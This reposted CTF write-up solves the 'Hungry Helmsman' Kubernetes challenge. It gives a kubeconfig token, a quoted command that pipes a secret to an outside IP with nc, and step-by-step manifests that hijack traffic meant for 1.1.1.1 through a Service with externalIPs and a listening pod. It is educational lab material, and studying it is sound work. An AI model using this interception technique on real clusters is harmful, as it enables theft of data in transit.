
文章转载自：[https://www.rayanle.cat/potluckctf-2023-hungry-helmsman/](https://www.rayanle.cat/potluckctf-2023-hungry-helmsman/) 

> Hungry Helmsman is a challenge I had the opportunity to solve during the CTF 2023 Potluck, which took place during the 37th Chaos Communication Congress. It's a Kubernetes challenge in which we're initially given a configuration with credentials. Thanks to these credentials, we can deploy a malicious pod to exploit poor partitioning between namespaces and retrieve the flag.

## Resolution :
To retrieve the configuration, you must first connect to a server :

```shell
rayanlecat@potluck2023 /workspace # nc challenge10.play.potluckctf.com 8888
             _   _            _        _    __
            | | | |          | |      | |  / _|
 _ __   ___ | |_| |_   _  ___| | _____| |_| |_
| '_ \ / _ \| __| | | | |/ __| |/ / __| __|  _|
| |_) | (_) | |_| | |_| | (__|   < (__| |_| |
| .__/ \___/ \__|_|\__,_|\___|_|\_\___|\__|_|
| |
|_|
    
Challenge: Hungry Helmsman
Creating Cluster
Waiting for control plane..........................................
Here is your Kubeconfig:

apiVersion: v1
clusters:
- cluster:
    server: https://flux-cluster-74ca68cd8370436984e2dd80c3601e28.challenge10.play.potluckctf.com
  name: ctf-cluster
contexts:
- context:
    cluster: ctf-cluster
    user: ctf-player
  name: ctf-cluster
current-context: ctf-cluster
kind: Config
preferences: {}
users:
- name: ctf-player
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ild6S0RQYTNfQWpsV1BtRnIyZmo1NS1SZEJST1lnM2JqYWRScF9PQWhwdjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAzODU2NDc2LCJpYXQiOjE3MDM4NTI4NzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImN0Zi1wbGF5ZXIiLCJ1aWQiOiJmMjY1NTE3Yy1jZjM1LTQwNzAtYTkwOS0zYWI4NjNmNWJlMjIifX0sIm5iZiI6MTcwMzg1Mjg3Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmLXBsYXllciJ9.oTSHy_oVpwSfdOrOKCpsZgQgIRk1Fa-QdCoB3KqBRiX-WtQWgcgLlKGUbT4405CnDc60A4c79lkDjwQbX3s4EUT3Zw7CZSFrpcZM1VBwAzsK1eRTRafrSoTbeYt6vp_80jNVVNyEN2HpECyxQbguMmmU65tTvGupKQq_ZWjH0Z3NhRTIXbBgTVESFxjoMQNA4NRQ1AzHHUzqisVMUgIyKtvT00sZhwDLiqf0UNTHwDX56-j5tBNFIBB4gePB4S5PPiBt1ebGpR6GQXYtnTL3SLtLJNg_f-1Qyr3Hb_htGQGf90TekbtaHzC6jDfJzXl5JR6pYAcXWdZmpl8V4V2uUw
```

Once you have retrieved the kubernetes configuration, you can check that it has been loaded into kubectl :

```shell
rayanlecat@potluck2023 /workspace #  # kubectl config --kubeconfig config view
apiVersion: v1
clusters:
- cluster:
    server: https://flux-cluster-74ca68cd8370436984e2dd80c3601e28.challenge10.play.potluckctf.com
  name: ctf-cluster
contexts:
- context:
    cluster: ctf-cluster
    user: ctf-player
  name: ctf-cluster
current-context: ctf-cluster2
kind: Config
preferences: {}
users:
- name: ctf-player
  user:
    token: REDACTED
```

First, I'll list the namespaces that exist in the kubernetes cluster:

```shell
rayanlecat@potluck2023 /workspace # kubectl get namespace      
NAME              STATUS   AGE
default           Active   99s
flag-reciever     Active   93s
flag-sender       Active   93s
kube-node-lease   Active   99s
kube-public       Active   99s
kube-system       Active   99s
```

In the challenge cluster we see two interesting namespaces:
- flag-reciever
- flag-sender

We'll now list the resources present in these two namespaces, including the pods:

```shell
rayanlecat@potluck2023 /workspace # kubectl get pods --namespace=flag-sender                           
NAME                           READY   STATUS    RESTARTS   AGE
flag-sender-676776d678-2g8vm   1/1     Running   0          8m12s

rayanlecat@potluck2023 /workspace # kubectl get pods --namespace=flag-reciever                           
No resources found in flag-reciever namespace.
```

There is a pod only in the flag-sender namespace, so we can retrieve information about this pod:

```shell
rayanlecat@potluck2023 /workspace # kubectl describe pods/flag-sender-676776d678-5s6t5 --namespace=flag-sender
Name:             flag-sender-676776d678-5s6t5
Namespace:        flag-sender
...[snip]...
    Command:
      sh
    Args:
      -c
      while true; do echo $FLAG | nc 1.1.1.1 80 || continue; echo 'Flag Send'; sleep 10; done
...[snip]...
```

We can see that the pod makes a connection to port 80 of ip 1.1.1.1 (which is cloudflare's DNS) every 10 seconds, sending the flag, but the problem is that we don't have access to the machine in question and we don't have access to the container running in this pod. The problem is how to impersonate or spoof the ip address 1.1.1.1 in order to retrieve the flag. To answer this question, we need to continue enumerating the cluster and our rights within it:

```shell
rayanlecat@potluck2023 /workspace # kubectl auth can-i --list --namespace=flag-reciever         
Resources                                       Non-Resource URLs                      Resource Names   Verbs
pods.*                                          []                                     []               [create delete]
services.*                                      []                                     []               [create delete]
...[snip]...
```

As you can see, you can create pods and services in the flag-reciever namspace. Let's try deploying a pod to check that it works properly:

```shell
rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
spec:
  containers:
  - name: evil-container
    image: busybox

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever 
Error from server (Forbidden): error when creating "pod.yml": pods "evil-pod" is forbidden: violates PodSecurity "restricted:latest": 
allowPrivilegeEscalation != false (container "evil-container" must set securityContext.allowPrivilegeEscalation=false), 
unrestricted capabilities (container "evil-container" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "evil-container" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "evil-container" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

We have a first problem when we try to deploy a pod. The problem is that we're violating the pod security policy, so we need to deploy a pod that respects these requirements:

```shell
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
spec:
  containers:
  - name: evil-container
    image: busybox
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000 
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault
```

Now we have a second problem: when we deploy the pod we are told that our container does not respect the memory and cpu quotas:

```shell
rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
Error from server (Forbidden): error when creating "pod.yml": pods "evil-pod" is forbidden: failed quota: flag-reciever: must specify limits.cpu for: evil-container; limits.memory for: evil-container; requests.cpu for: evil-container; requests.memory for: evil-container
```

First, we will retrieve the value of these quotas in order to modify the configuration of our pod:

```shell
rayanlecat@potluck2023 /workspace # kubectl describe quota --namespace=flag-reciever         
Name:            flag-reciever
Namespace:       flag-reciever
Resource         Used  Hard
--------         ----  ----
limits.cpu       0     200m
limits.memory    0     100M
requests.cpu     0     100m
requests.memory  0     50M
```

So we have just the characteristics of our container and we manage to deploy our pod:

```shell
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
spec:
  containers:
  - name: evil-container
    image: busybox
    resources:
      requests:
        memory: "50M"
        cpu: "50m"
      limits:
        memory: "100M"
        cpu: "200m"
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000 
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created
```

The question now is how to ensure that a pod in the flag-sender namespace can communicate with a pod in the flag-reciever namespace. To answer this question, let's take a look at networkpolicies:

```shell
rayanlecat@potluck2023 /workspace # kubectl get networkpolicies --namespace=flag-reciever         
NAME            POD-SELECTOR   AGE
flag-reciever   <none>         17m

rayanlecat@potluck2023 /workspace # kubectl describe networkpolicies --namespace flag-reciever
Name:         flag-reciever
Namespace:    flag-reciever
Created on:   2023-12-29 15:50:55 +0100 CET
Labels:       <none>
Annotations:  <none>
Spec:
  PodSelector:     <none> (Allowing the specific traffic to all pods in this namespace)
  Allowing ingress traffic:
    To Port: <any> (traffic allowed to all ports)
    From:
      NamespaceSelector: ns=flag-sender
      PodSelector: app=flag-sender
  Allowing egress traffic:
    <none> (Selected pods are isolated for egress connectivity)
  Policy Types: Ingress, Egress
  ```

  We can see that a rule has been set up to authorize all ingress traffic from the flag-sender application in the flag-sender namespace to all pods in the flag-reciever namespace, so normally if I manage to create a service with externalIP 1.1.1.1 that exposes port 80 on the container of a pod I control, I should be able to retrieve the flag. To do this, the first step is to open a listening port on a :

  ```shell
  rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
spec:
  containers:
  - name: evil-container
    image: busybox
    ports:
      - containerPort: 80
    args: ["sh", "-c", "while true; do nc -l -v -p 80; done"]
    resources:
      requests:
        memory: "50M"
        cpu: "50m"
      limits:
        memory: "100M"
        cpu: "200m"
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000 
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever
nc: bind: Permission denied
```

The problem here is that when deploying our pod, we have to respect their security policy and therefore not launch our container as root, which means we can't listen on port 80 as it's a privileged port. To overcome this, we can listen on an unprivileged port:

```shell
rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
spec:
  containers:
  - name: evil-container
    image: busybox
    ports:
      - containerPort: 1337
    args: ["sh", "-c", "while true; do nc -l -v -p 1337; done"]
    resources:
      requests:
        memory: "50M"
        cpu: "50m"
      limits:
        memory: "100M"
        cpu: "200m"
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000 
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever
listening on [::]:1337 ...
```

We can now see that we can start listening on port 1337, but we need to create the associated service that will expose our port on ip 1.1.1.1 and port 80 to retrieve the flag. However, don't forget to label our pod as an application, otherwise we won't be able to select it with our service (perhaps there's a way of selecting a pod directly without labeling it, but I haven't found one):

```shell
rayanlecat@potluck2023 /workspace # cat service.yml
apiVersion: v1
kind: Service
metadata:
  name: evil-service
  namespace: flag-reciever
spec:
  selector:
    app: evil-receiver
  ports:
    - protocol: TCP
      port: 80
      targetPort: 1337
  externalIPs:
    - 1.1.1.1

rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: flag-reciever
  labels:
    app: evil-receiver
spec:
  containers:
  - name: evil-container
    image: busybox
    ports:
      - containerPort: 1337
    args: ["sh", "-c", "while true; do nc -l -v -p 1337; done"]
    resources:
      requests:
        memory: "50M"
        cpu: "50m"
      limits:
        memory: "100M"
        cpu: "200m"
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000 
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl apply -f service.yml --namespace=flag-reciever
service/evil-service created
```

We've successfully deployed our pod and our service. And finally, when we look at our pod's logs, we can see that we've received the flag :

```shell
rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever    
listening on [::]:1337 ...
connect to [::ffff:192.168.20.6]:1337 from (null) ([::ffff:192.168.20.0]:7004)
potluck{kubernetes_can_be_a_bit_weird}
```

Flag :
potluck{kubernetes_can_be_a_bit_weird}

## Conclusion :
I found the challenge rather pleasant, even if it wasn't very hard. In the context of the CTF, which only lasted 24 hours, and with the mass of challenges there were alongside it, a little challenge like that is always a pleasure, especially when it's a technology like kubernetes, which you don't find very often in CTF.
I'd also like to congratulate Calle Svensson, who single-handedly organized the CTF and ensured it ran smoothly throughout the event.
And of course, thanks to The Flat Network Society for allowing me to take part in the CTF with them, and to all those who were part of the team, it was really cool!

## Ressources :
https://www.synacktiv.com/en/publications/kubernetes-namespaces-isolation-what-it-is-what-it-isnt-life-universe-and-everything
https://kubernetes.io/docs/reference/kubectl/
https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/
https://github.com/DataDog/KubeHound
